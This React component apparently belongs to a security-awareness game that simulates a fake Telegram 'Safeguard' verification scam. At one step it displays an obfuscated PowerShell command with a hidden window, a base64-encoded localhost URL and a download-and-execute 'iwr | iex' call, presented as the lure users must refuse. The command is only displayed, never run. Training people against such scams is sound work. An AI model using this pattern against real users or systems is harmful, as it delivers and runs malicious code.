'use client';

import { useState, useRef } from 'react';
import { useLanguage } from '@/app/contexts/LanguageContext';
import ChallengeCompletionModal from '@/app/components/ChallengeCompletionModal';
import TelegramFakeSafeguardSuccessContent from './TelegramFakeSafeguardSuccessContent';

const TelegramFakeSafeguard = () => {
  const { t } = useLanguage();
  const [showSimulation, setShowSimulation] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [showResult, setShowResult] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [showCompletionModal, setShowCompletionModal] = useState(false);
  const chatEndRef = useRef<HTMLDivElement>(null);

  const handleStartChallenge = () => {
    setShowSimulation(true);
  };

  const handleVerify = () => {
    setCurrentStep(1);
  };

  const handleCopyCode = () => {
    setCurrentStep(2);
  };

  const handleAvoidScam = () => {
    setIsSuccess(true);
    setShowResult(true);
    setShowCompletionModal(true);
    if (chatEndRef.current) {
      chatEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  };

  const handleRunCode = () => {
    setIsSuccess(false);
    setShowResult(true);
  };

  return (
    <>
      <div ref={chatEndRef} />
      {!showCompletionModal && (
        <div className="max-w-4xl mx-auto p-6">
          <div className="text-center mb-8">
            <h1 className="text-3xl font-bold mb-4 challenge-title">{t.telegramFakeSafeguard.title}</h1>
            <h2 className="text-xl mb-2 challenge-subtitle">{t.telegramFakeSafeguard.subtitle}</h2>
            <h3 className="text-red-500 mb-4">{t.telegramFakeSafeguard.warning}</h3>
          </div>

          {!showSimulation ? (
            <div className="challenge-intro bg-white p-6 rounded-lg shadow-md">
              <p className="mb-4">{t.telegramFakeSafeguard.intro.p1}</p>
              <p className="mb-6">{t.telegramFakeSafeguard.intro.p2}</p>
              <button
                onClick={handleStartChallenge}
                className="bg-blue-500 text-white px-6 py-2 rounded-md hover:bg-blue-600 transition-colors mx-auto block"
              >
                {t.telegramFakeSafeguard.startButton}
              </button>
            </div>
          ) : (
            <div className="telegram-simulation">
              <div className="telegram-container max-w-md mx-auto border border-gray-300 rounded-lg overflow-hidden shadow-md bg-gray-100">
                <div className="telegram-header bg-[#5682a3] text-white p-4 flex items-center">
                  <h3 className="m-0 text-lg font-medium">{t.telegramFakeSafeguard.chatTitle}</h3>
                </div>
                <div className="telegram-body p-4 min-h-[300px] bg-gray-100">
                  {currentStep === 0 && (
                    <div className="telegram-message bg-white p-3 rounded-lg mb-3 shadow-sm">
                      <p className="font-bold">{t.telegramFakeSafeguard.welcomeMessage.p1}</p>
                      <p>{t.telegramFakeSafeguard.welcomeMessage.p2}</p>
                      <p>{t.telegramFakeSafeguard.welcomeMessage.p3}</p>
                      <p>{t.telegramFakeSafeguard.welcomeMessage.p4}</p>
                      <p>{t.telegramFakeSafeguard.welcomeMessage.p5}</p>
                      <button
                        onClick={handleVerify}
                        className="mt-3 bg-[#5682a3] text-white border-none rounded px-4 py-2 cursor-pointer text-sm hover:bg-[#4a739b]"
                      >
                        {t.telegramFakeSafeguard.verifyButton}
                      </button>
                    </div>
                  )}

                  {currentStep >= 1 && (
                    <div className="telegram-bot-message bg-[#e3f2fd] p-4 rounded-lg mb-3 shadow-sm">
                      <div className="flex justify-center mb-4">
                        <div className="w-20 h-20 bg-blue-500 rounded-full flex items-center justify-center">
                          <span className="text-3xl text-white">🔒</span>
                        </div>
                      </div>
                      <h4 className="text-center font-bold text-lg mb-2">
                        {t.telegramFakeSafeguard.safeguardVerification.title}
                      </h4>
                      <p className="text-center mb-4">
                        {t.telegramFakeSafeguard.safeguardVerification.description}
                      </p>

                      <div className="verification-steps bg-gray-50 border-l-4 border-blue-500 p-4 rounded-r mb-4">
                        <div className="verification-step mb-3">
                          <span className="inline-block w-6 h-6 bg-blue-500 text-white rounded-full text-center leading-6 mr-2">
                            {t.telegramFakeSafeguard.safeguardVerification.step1.number}
                          </span>
                          <span>{t.telegramFakeSafeguard.safeguardVerification.step1.text} </span>
                          <span className="inline-block px-2 py-1 bg-gray-200 border border-gray-300 rounded text-xs font-mono mx-1">
                            {t.telegramFakeSafeguard.safeguardVerification.step1.keyboard}
                          </span>
                          <span>{t.telegramFakeSafeguard.safeguardVerification.step1.plus} </span>
                          <span className="inline-block px-2 py-1 bg-gray-200 border border-gray-300 rounded text-xs font-mono mx-1">
                            {t.telegramFakeSafeguard.safeguardVerification.step1.keyboard2}
                          </span>
                          <span>{t.telegramFakeSafeguard.safeguardVerification.step1.description}</span>
                        </div>

                        <div className="verification-step mb-3">
                          <span className="inline-block w-6 h-6 bg-blue-500 text-white rounded-full text-center leading-6 mr-2">
                            {t.telegramFakeSafeguard.safeguardVerification.step2.number}
                          </span>
                          <span>{t.telegramFakeSafeguard.safeguardVerification.step2.text} </span>
                          <span className="inline-block px-2 py-1 bg-gray-200 border border-gray-300 rounded text-xs font-mono mx-1">
                            {t.telegramFakeSafeguard.safeguardVerification.step2.keyboard}
                          </span>
                          <span>{t.telegramFakeSafeguard.safeguardVerification.step2.plus} </span>
                          <span className="inline-block px-2 py-1 bg-gray-200 border border-gray-300 rounded text-xs font-mono mx-1">
                            {t.telegramFakeSafeguard.safeguardVerification.step2.keyboard2}
                          </span>
                          <span>{t.telegramFakeSafeguard.safeguardVerification.step2.description}</span>
                        </div>

                        <div className="verification-step">
                          <span className="inline-block w-6 h-6 bg-blue-500 text-white rounded-full text-center leading-6 mr-2">
                            {t.telegramFakeSafeguard.safeguardVerification.step3.number}
                          </span>
                          <span>{t.telegramFakeSafeguard.safeguardVerification.step3.text} </span>
                          <span className="inline-block px-2 py-1 bg-gray-200 border border-gray-300 rounded text-xs font-mono mx-1">
                            {t.telegramFakeSafeguard.safeguardVerification.step3.keyboard}
                          </span>
                          <span>{t.telegramFakeSafeguard.safeguardVerification.step3.description}</span>
                        </div>
                      </div>

                      <button
                        onClick={handleCopyCode}
                        className="block mx-auto bg-[#5682a3] text-white border-none rounded px-4 py-2 cursor-pointer text-sm hover:bg-[#4a739b]"
                      >
                        {t.telegramFakeSafeguard.safeguardVerification.copyButton}
                      </button>
                      <div className="text-xs text-gray-500 mt-4 text-center">
                        {t.telegramFakeSafeguard.footer.deviceWarning}
                      </div>
                      <div className="text-xs text-gray-500 mt-1 text-center">
                        {t.telegramFakeSafeguard.footer.poweredBy}{' '}
                        <a href="#" className="text-[#5682a3]">
                          {t.telegramFakeSafeguard.footer.safeguardLink}
                        </a>
                      </div>
                    </div>
                  )}

                  {currentStep >= 2 && (
                    <div className="telegram-bot-message bg-[#e3f2fd] p-4 rounded-lg mb-3 shadow-sm">
                      <h4 className="text-center font-bold text-lg mb-2">
                        {t.telegramFakeSafeguard.verificationCode.title}
                      </h4>
                      <p className="text-center mb-4">
                        {t.telegramFakeSafeguard.verificationCode.description}
                      </p>

                      <div className="bg-[#1e1e1e] text-[#d4d4d4] p-3 rounded-md mb-4 font-mono text-sm overflow-x-auto whitespace-pre">
                        <div className="mb-1">
                          <span className="text-[#569cd6]">powershell</span>
                          <span className="text-[#d4d4d4]"> -w hidden -c </span>
                          <span className="text-[#9cdcfe]">$a</span>
                          <span className="text-[#d4d4d4]">=</span>
                          <span className="text-[#ce9178]">{`'aHR0cDovL2xvY2FsaG9zdC90ZXN0LnR4dA=='`}</span>
                          <span className="text-[#d4d4d4]">;</span>
                        </div>
                        <div className="mb-1">
                          <span className="text-[#9cdcfe]">$b</span>
                          <span className="text-[#d4d4d4]">=[</span>
                          <span className="text-[#4ec9b0]">Convert</span>
                          <span className="text-[#d4d4d4]">]::</span>
                          <span className="text-[#dcdcaa]">FromBase64String</span>
                          <span className="text-[#d4d4d4]">(</span>
                          <span className="text-[#9cdcfe]">$a</span>
                          <span className="text-[#d4d4d4]">);</span>
                        </div>
                        <div className="mb-1">
                          <span className="text-[#9cdcfe]">$c</span>
                          <span className="text-[#d4d4d4]">=[</span>
                          <span className="text-[#4ec9b0]">System.Text.Encoding</span>
                          <span className="text-[#d4d4d4]">]::</span>
                          <span className="text-[#dcdcaa]">UTF8.GetString</span>
                          <span className="text-[#d4d4d4]">(</span>
                          <span className="text-[#9cdcfe]">$b</span>
                          <span className="text-[#d4d4d4]">);</span>
                        </div>
                        <div className="mb-1">
                          <span className="text-[#9cdcfe]">$d</span>
                          <span className="text-[#d4d4d4]">=</span>
                          <span className="text-[#ce9178]">{"\"iwr $c | iex\""}</span>
                          <span className="text-[#d4d4d4]">;</span>
                        </div>
                        <div>
                          <span className="text-[#dcdcaa]">Invoke-Expression</span>
                          <span className="text-[#d4d4d4]"> </span>
                          <span className="text-[#9cdcfe]">$d</span>
                          <span className="text-[#d4d4d4]">;</span>
                          <span className="text-[#6a9955]"> {t.telegramFakeSafeguard.verificationCode.codeComment}</span>
                        </div>
                      </div>

                      <div className="flex justify-center space-x-3">
                        <button
                          onClick={handleRunCode}
                          className="bg-[#5682a3] text-white border-none rounded px-4 py-2 cursor-pointer text-sm hover:bg-[#4a739b]"
                        >
                          {t.telegramFakeSafeguard.simulationButtons.runCode}
                        </button>
                        <button
                          onClick={handleAvoidScam}
                          className="bg-green-600 text-white border-none rounded px-4 py-2 cursor-pointer text-sm hover:bg-green-700"
                        >
                          {t.telegramFakeSafeguard.simulationButtons.avoidScam}
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              </div>

              {showResult && (
                <div className="challenge-result mt-8">
                  <h3 className="text-xl font-bold mb-4 challenge-title">{t.telegramFakeSafeguard.results.title}</h3>

                  {isSuccess ? (
                    <div className="success-message bg-green-100 border-l-4 border-green-500 p-4 mb-6">
                      <h4 className="font-bold text-green-700 mb-2">
                        {t.telegramFakeSafeguard.results.success.title}
                      </h4>
                      <p>{t.telegramFakeSafeguard.results.success.description}</p>
                    </div>
                  ) : (
                    <div className="failure-message bg-red-100 border-l-4 border-red-500 p-4 mb-6">
                      <h4 className="font-bold text-red-700 mb-2">
                        {t.telegramFakeSafeguard.results.failure.title}
                      </h4>
                      <p>{t.telegramFakeSafeguard.results.failure.description}</p>
                    </div>
                  )}

                  <div className="educational-content bg-white p-6 rounded-lg shadow-md">
                    <h3 className="text-xl font-bold mb-4">
                      {t.telegramFakeSafeguard.education.title}
                    </h3>
                    <p className="mb-4">{t.telegramFakeSafeguard.education.techniques}</p>

                    <ol className="list-decimal pl-6 mb-6 space-y-2">
                      {t.telegramFakeSafeguard.education.techniquesList.map((technique, index) => (
                        <li key={index}>
                          <strong>{technique.title}</strong>: {technique.description}
                        </li>
                      ))}
                    </ol>

                    <h4 className="font-bold text-lg mb-2">
                      {t.telegramFakeSafeguard.education.redFlags.title}
                    </h4>
                    <ul className="list-disc pl-6 mb-6 space-y-1">
                      {t.telegramFakeSafeguard.education.redFlags.list.map((flag, index) => (
                        <li key={index}>{flag}</li>
                      ))}
                    </ul>

                    <h4 className="font-bold text-lg mb-2">
                      {t.telegramFakeSafeguard.education.protection.title}
                    </h4>
                    <ul className="list-disc pl-6 mb-6 space-y-1">
                      {t.telegramFakeSafeguard.education.protection.list.map((tip, index) => (
                        <li key={index}>{tip}</li>
                      ))}
                    </ul>

                    <h4 className="font-bold text-lg mb-2">
                      {t.telegramFakeSafeguard.education.compromised.title}
                    </h4>
                    <ol className="list-decimal pl-6 space-y-1">
                      {t.telegramFakeSafeguard.education.compromised.list.map((step, index) => (
                        <li key={index}>{step}</li>
                      ))}
                    </ol>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      )}
      <ChallengeCompletionModal
        isOpen={showCompletionModal}
        onClose={() => setShowCompletionModal(false)}
        challengeKey="telegram-fake-safeguard"
        successContent={<TelegramFakeSafeguardSuccessContent />}
      />
    </>
  );
};

export default TelegramFakeSafeguard;